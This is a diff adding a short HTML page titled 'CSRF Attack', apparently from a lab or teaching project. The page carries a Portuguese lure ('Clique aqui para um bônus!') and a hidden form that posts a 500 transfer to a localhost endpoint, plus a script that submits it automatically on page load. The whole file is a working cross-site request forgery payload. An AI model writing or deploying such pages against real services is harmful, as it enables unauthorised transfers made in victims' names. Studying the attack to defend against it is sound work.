@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>Você foi atacado!</h1>
+    <form action="http://localhost:3000/transfer" method="POST">
+        <input type="hidden" name="amount" value="500">
+        <input type="submit" value="Clique aqui para um bônus!">
+    </form>
+    <script>
+        // Auto-submit the form
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
